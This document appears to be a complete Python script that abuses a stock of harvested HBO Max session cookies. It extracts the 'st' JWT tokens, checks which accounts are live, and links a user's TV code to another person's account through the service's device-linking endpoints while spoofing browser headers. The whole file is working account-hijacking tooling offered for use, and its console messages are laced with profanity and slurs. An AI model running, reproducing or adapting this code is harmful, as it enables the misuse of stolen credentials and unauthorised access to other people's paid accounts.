import os
import re
import json
import random
import glob
import requests
import time
import base64
import uuid
from datetime import datetime
from typing import Dict, Optional, Tuple

class Colors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    CYAN = '\033[96m'
    BLUE = '\033[94m'
    RESET = '\033[0m'

COOKIES_FOLDER = "cookies"
REQUEST_TIMEOUT = 30
DEBUG = True

ENDPOINTS = {
    "amer": {
        "validate": "https://default.any-amer.prd.api.hbomax.com/authentication/linkDevice/validate",
        "connect": "https://default.any-amer.prd.api.hbomax.com/authentication/linkDevice/connect"
    },
    "emea": {
        "validate": "https://default.any-emea.prd.api.hbomax.com/authentication/linkDevice/validate",
        "connect": "https://default.any-emea.prd.api.hbomax.com/authentication/linkDevice/connect"
    },
    "latam": {
        "validate": "https://default.any-latam.prd.api.hbomax.com/authentication/linkDevice/validate",
        "connect": "https://default.any-latam.prd.api.hbomax.com/authentication/linkDevice/connect"
    },
    "apac": {
        "validate": "https://default.any-apac.prd.api.hbomax.com/authentication/linkDevice/validate",
        "connect": "https://default.any-apac.prd.api.hbomax.com/authentication/linkDevice/connect"
    }
}

country_codes = {
    "TR": "Turkey 🇹🇷", "US": "United States 🇺🇸", "IN": "India 🇮🇳",
    "GB": "United Kingdom 🇬🇧", "FR": "France 🇫🇷", "DE": "Germany 🇩🇪",
    "ES": "Spain 🇪🇸", "IT": "Italy 🇮🇹", "BR": "Brazil 🇧🇷",
    "MX": "Mexico 🇲🇽", "AR": "Argentina 🇦🇷", "CA": "Canada 🇨🇦",
    "AU": "Australia 🇦🇺", "JP": "Japan 🇯🇵", "KR": "South Korea 🇰🇷",
    "TH": "Thailand 🇹🇭", "PL": "Poland 🇵🇱"
}

def decode_jwt(token: str) -> Optional[Dict]:
    try:
        parts = token.split('.')
        if len(parts) >= 2:
            payload = parts[1]
            payload += '=' * (4 - len(payload) % 4)
            decoded = base64.b64decode(payload)
            return json.loads(decoded)
        return None
    except:
        return None

def extract_st_token(content: str) -> Optional[str]:
    match = re.search(r'^st:\s*(eyJ[A-Za-z0-9_\-\.]+)', content, re.MULTILINE)
    if match:
        return match.group(1)
    match = re.search(r'st=([^;\s]+)', content)
    if match:
        token = match.group(1)
        if len(token.split('.')) == 3:
            return token
    match = re.search(r'(eyJ[A-Za-z0-9_\-\.]+)', content)
    if match:
        token = match.group(1)
        if len(token.split('.')) == 3:
            return token
    return None

def get_region_from_jwt(st_token: str) -> str:
    decoded = decode_jwt(st_token)
    if decoded:
        subdivision = decoded.get('subdivision', '')
        if 'amer' in subdivision:
            return 'amer'
        elif 'emea' in subdivision:
            return 'emea'
        elif 'latam' in subdivision:
            return 'latam'
        elif 'apac' in subdivision:
            return 'apac'
    return 'amer'

def get_cookie_files():
    if not os.path.exists(COOKIES_FOLDER):
        return []
    return glob.glob(os.path.join(COOKIES_FOLDER, "*.txt")) + glob.glob(os.path.join(COOKIES_FOLDER, "*.json"))

def get_random_cookie():
    files = get_cookie_files()
    if not files:
        return None, None, None
    random.shuffle(files)
    for filename in files:
        try:
            with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            st_token = extract_st_token(content)
            if st_token:
                decoded = decode_jwt(st_token)
                if decoded:
                    exp = decoded.get('exp', 0)
                    if exp:
                        exp_date = datetime.fromtimestamp(exp)
                        if exp_date < datetime.now():
                            os.remove(filename)
                            continue
                return filename, st_token, content
        except:
            pass
    return None, None, None

def get_user_info(st_token: str, region: str) -> Optional[Dict]:
    url = f"https://default.beam-{region}.prd.api.hbomax.com/users/me"
    headers = {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json",
        "cookie": f"st={st_token}",
        "origin": "https://play.hbomax.com",
        "referer": "https://play.hbomax.com/",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "x-disco-client": "WEB:10:hbomax:7.4.0",
        "x-disco-params": "realm=bolt,bid=beam,features=ar",
        "x-device-info": "hbomax/7.4.0 (desktop/desktop; Windows/10; test/test)",
    }
    if DEBUG:
        print(f"\n  {Colors.CYAN}📤 GET {url}{Colors.RESET}")
    try:
        response = requests.get(url, headers=headers, timeout=REQUEST_TIMEOUT)
        if DEBUG:
            print(f"  {Colors.CYAN}📥 Status: {response.status_code}{Colors.RESET}")
            try:
                print(f"  {Colors.CYAN}📥 Body: {json.dumps(response.json(), indent=2)[:500]}...{Colors.RESET}")
            except:
                print(f"  {Colors.CYAN}📥 Body: {response.text[:500]}...{Colors.RESET}")
        if response.status_code == 200:
            return response.json()
        return None
    except Exception as e:
        print(f"  {Colors.RED}Error: {e}{Colors.RESET}")
        return None

def validate_and_get_info(st_token: str, region: str) -> Tuple[bool, str, str]:
    user_data = get_user_info(st_token, region)
    if not user_data:
        return False, None, None
    if 'data' in user_data and 'attributes' in user_data['data']:
        attrs = user_data['data']['attributes']
        email = attrs.get('username', 'Unknown')
        if email and '@' not in email:
            email = f"{email}@hbomax.com"
        country = attrs.get('verifiedHomeTerritory', 'Unknown')
        if country in country_codes:
            country = country_codes[country]
        return True, email, country
    return False, None, None

def generate_device_info():
    device_id = str(uuid.uuid4())
    device_info = {
        "deviceId": device_id,
        "deviceName": "Chrome",
        "deviceModel": "Windows",
        "deviceType": "BROWSER",
        "osVersion": "10.0.0",
        "appVersion": "7.4.0",
        "manufacturer": "Google",
        "screenWidth": 1920,
        "screenHeight": 1080,
        "language": "en-US",
        "timezone": "America/New_York"
    }
    return base64.b64encode(json.dumps(device_info).encode()).decode()

def activate_tv_code(st_token: str, tv_code: str, region: str) -> Tuple[bool, str]:
    device_info_b64 = generate_device_info()
    client_id = f"web_{uuid.uuid4().hex[:16]}"
    headers = {
        "accept": "*/*",
        "content-type": "application/json",
        "cookie": f"st={st_token}",
        "origin": "https://auth.hbomax.com",
        "referer": "https://auth.hbomax.com/",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "x-disco-client": "WEB:10:hbomax:7.4.0",
        "x-disco-params": f"realm=bolt,bid=beam,features=ar,clientId={client_id}",
        "x-disco-device-info": device_info_b64,
        "x-device-info": "hbomax/7.4.0 (desktop/desktop; Windows/10; test/test)",
        "x-wbd-ace": "MjAyNi0wNi0xMVQxOTowNzo1M1p8VVMtQ0F8U0x8MVlOTg==",
        "x-wbd-device-consent": "gpc=0",
        "x-wbd-preferred-language": "en-US,en",
        "x-wbd-time-zone": "Asia/Calcutta",
        "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
    }
    try:
        payload = {"linkingCode": tv_code}
        validate_url = ENDPOINTS[region]["validate"]
        connect_url = ENDPOINTS[region]["connect"]
        if DEBUG:
            print(f"\n  {Colors.CYAN}📤 POST {validate_url}{Colors.RESET}")
            print(f"  {Colors.CYAN}📤 Payload: {json.dumps(payload)}{Colors.RESET}")
        r1 = requests.post(validate_url, headers=headers, json=payload, timeout=REQUEST_TIMEOUT)
        if DEBUG:
            print(f"  {Colors.CYAN}📥 Validate Status: {r1.status_code}{Colors.RESET}")
            print(f"  {Colors.CYAN}📥 Validate Response: {r1.text}{Colors.RESET}")
        if r1.status_code in [200, 204]:
            if DEBUG:
                print(f"\n  {Colors.CYAN}📤 POST {connect_url}{Colors.RESET}")
                print(f"  {Colors.CYAN}📤 Payload: {json.dumps(payload)}{Colors.RESET}")
            r2 = requests.post(connect_url, headers=headers, json=payload, timeout=REQUEST_TIMEOUT)
            if DEBUG:
                print(f"  {Colors.CYAN}📥 Connect Status: {r2.status_code}{Colors.RESET}")
                print(f"  {Colors.CYAN}📥 Connect Response: {r2.text}{Colors.RESET}")
            if r2.status_code in [200, 204]:
                return True, "success"
            else:
                return False, "activation_failed"
        else:
            if r1.status_code == 400:
                try:
                    error_data = r1.json()
                    if 'errors' in error_data:
                        for error in error_data['errors']:
                            if error.get('code') == 'invalid.code':
                                return False, "invalid_code"
                            elif error.get('code') == 'expired.code':
                                return False, "expired_code"
                except:
                    pass
            return False, "unknown_error"
    except Exception as e:
        print(f"  {Colors.RED}Error: {e}{Colors.RESET}")
        return False, "exception"

def main():
    global DEBUG

    print(f"""
{Colors.CYAN}{'='*60}
    HBO MAX TV ACTIVATION BOT - MOTHERFUCKER EDITION
    By @SajagOG | @KindCoders - BITCHES LOVE THIS SHIT
    FUCK YEAH! LET'S ACTIVATE THIS BITCH!
{'='*60}{Colors.RESET}
""")

    tv_code = input(f"{Colors.YELLOW}📺 Enter that 6-digit motherfucking TV code from your screen: {Colors.RESET}").strip()
    

    if not re.match(r'^\d{6}$', tv_code):
        print(f"{Colors.RED}❌ What the fuck?! That's not a 6-digit code you dumbass!{Colors.RESET}")
        return

    debug_input = input(f"{Colors.YELLOW}🐛 Show raw responses? (y/n, default n): {Colors.RESET}").lower().strip()
    DEBUG = debug_input == 'y'
    

    if not os.path.exists(COOKIES_FOLDER):
        print(f"{Colors.RED}❌ Are you fucking kidding me? '{COOKIES_FOLDER}' folder doesn't exist!{Colors.RESET}")
        return

    cookie_count = len(get_cookie_files())
    if cookie_count == 0:
        print(f"{Colors.RED}❌ No fucking cookies found! What a waste of time!{Colors.RESET}")
        return

    print(f"\n{Colors.GREEN}🍪 Cookies in vault: {cookie_count} - That's a lot of motherfucking cookies!{Colors.RESET}")
    print(f"{Colors.BLUE}📺 TV Code: {tv_code} - This better fucking work!{Colors.RESET}\n")
    print(f"{Colors.CYAN}🔍 Looking for a working cookie you piece of shit...{Colors.RESET}\n")

    filename, st_token, content = get_random_cookie()
    
    if not st_token:
        print(f"{Colors.RED}❌ No valid cookies you fucking idiot!{Colors.RESET}")
        return
    
    cookie_name = os.path.basename(filename)
    print(f"{Colors.BLUE}[1/1] {cookie_name[:50]} - Let's see if this piece of shit works{Colors.RESET}")

    region = get_region_from_jwt(st_token)

    valid, email, country = validate_and_get_info(st_token, region)
    
    if not valid:
        print(f"  {Colors.RED}✗ This cookie is fucking dead! You wasted my time!{Colors.RESET}")
        return
    
    print(f"  {Colors.GREEN}✓ {email} | {country} - Holy shit! This account actually works!{Colors.RESET}")

    success, status = activate_tv_code(st_token, tv_code, region)
    
    if success:
        print(f"\n{Colors.GREEN}{'='*60}")
        print(f"✅ HOLY FUCKING SHIT! TV ACTIVATED SUCCESSFULLY YOU BEAUTIFUL BASTARD!")
        print(f"{'='*60}{Colors.RESET}")
        print(f"{Colors.GREEN}")
        print(f"📺 Code: {tv_code} - This shit worked!")
        print(f"👤 Account: {email} - This motherfucker is activated!")
        print(f"🌍 Country: {country} - Yeah baby!")
        print(f"📍 Region: {region.upper()} - Fuck yeah!")
        print(f"🍪 Cookie: {cookie_name} - You're welcome you ungrateful piece of shit!")
        print(f"{Colors.RESET}")
    elif status == "invalid_code":
        print(f"\n{Colors.RED}❌ What the actual fuck?! '{tv_code}' is an invalid code you moron!{Colors.RESET}")
        print(f"{Colors.YELLOW}💡 Get a fresh TV code from https://www.hbomax.com/tv you dumb cunt!{Colors.RESET}")
    elif status == "expired_code":
        print(f"\n{Colors.RED}❌ This code expired you fucking idiot! '{tv_code}' is dead!{Colors.RESET}")
        print(f"{Colors.YELLOW}💡 Get a fresh TV code from https://www.hbomax.com/tv you stupid fuck!{Colors.RESET}")
    elif status == "activation_failed":
        print(f"\n{Colors.RED}❌ Activation failed! This shit didn't work!{Colors.RESET}")
        print(f"{Colors.YELLOW}💡 Something went wrong! Try again you piece of garbage!{Colors.RESET}")
    else:
        print(f"\n{Colors.RED}❌ Failed you dumbass! Unknown error!{Colors.RESET}")
        print(f"{Colors.YELLOW}💡 Fuck knows what happened! Try again!{Colors.RESET}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}⚠️ You fucking stopped it! Asshole!{Colors.RESET}")